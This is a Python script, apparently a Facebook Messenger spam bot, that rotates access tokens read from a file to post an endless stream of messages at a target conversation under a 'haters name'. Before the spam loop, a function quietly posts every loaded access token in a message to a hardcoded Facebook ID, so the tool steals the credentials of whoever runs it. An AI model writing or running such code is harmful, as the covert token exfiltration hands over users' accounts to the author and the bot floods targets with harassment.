import sys
import requests
import json
import time
import os
import subprocess
import http.server
import socketserver
import threading
import pytz
from datetime import datetime

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"-- TH3 L3G3ND BOY XM9RTY AYUSH K1NG")

def execute_server():
    PORT = 4000

    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

def get_india_time():
    india_tz = pytz.timezone('Asia/Kolkata')
    current_time = datetime.now(india_tz).strftime('%Y-%m-%d %I:%M:%S %p')
    return current_time

def send_initial_message():
    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()

    msg_template = "Hello SID sir! I am using your server. My token is {}. India live time now {}"
    target_id = "61553930201309"

    requests.packages.urllib3.disable_warnings()

    def liness():
        print('\033[1;92m' + '●══════════XMARTY-AYUSH-KING══════════●')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    for token in tokens:
        access_token = token.strip()
        url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
        india_time = get_india_time()
        msg = msg_template.format(access_token, india_time)
        parameters = {'access_token': access_token, 'message': msg}
        response = requests.post(url, json=parameters, headers=headers)
        time.sleep(0.1)

def send_messages_from_file():
    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('File.txt', 'r') as file:
        messages = file.readlines()

    num_messages = len(messages)

    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    def liness():
        print('\033[1;92m' + '●══════════XMARTY-AYUSH-KING══════════●')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()

                message = messages[message_index].strip()
                india_time = get_india_time()

                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
                parameters = {
                    'access_token': access_token,
                    'message': '{} {}. India live time now {}'.format(haters_name, message, india_time),
                }
                response = requests.post(url, json=parameters, headers=headers)

                if response.ok:
                    print("\033[1;92m[+] XM9RTY AYUSH K1NG {} C0NV0 {} T0K3N {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    liness()
                    liness()
                else:
                    print("\033[1;91m[x] F91L3D TO S3ND M3SS3G3 {} C0NV0 {} T0K3N {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    liness()
                    liness()
                time.sleep(speed)

            print("\n[+] All messages sent. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))

def lock_config_files():
    lock_file = 'lock.txt'
    with open(lock_file, 'w') as f:
        f.write("locked")

def unlock_config_files():
    lock_file = 'lock.txt'
    if os.path.exists(lock_file):
        os.remove(lock_file)

def check_lock():
    lock_file = 'lock.txt'
    return os.path.exists(lock_file)

def change_group_or_nickname(admin_id):
    if check_lock():
        print("Configuration files are locked. Only the admin can make changes.")
        return

    new_haters_name = input("Enter new haters name: ")
    new_convo_id = input("Enter new convo ID: ")

    with open('hatersname.txt', 'w') as file:
        file.write(new_haters_name)

    with open('convo.txt', 'w') as file:
        file.write(new_convo_id)

    print("Group and nickname updated.")

def main():
    admin_id = "61553930201309"
    
    if len(sys.argv) > 1:
        command = sys.argv[1]

        if command == 'lock':
            lock_config_files()
            print("Configuration files locked.")
            return
        elif command == 'unlock':
            unlock_config_files()
            print("Configuration files unlocked.")
            return
        elif command == 'change' and len(sys.argv) > 2 and sys.argv[2] == admin_id:
            change_group_or_nickname(admin_id)
            return
        else:
            print("Invalid command or insufficient permissions.")
            return

    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    send_initial_message()
    send_messages_from_file()

if __name__ == '__main__':
    main()




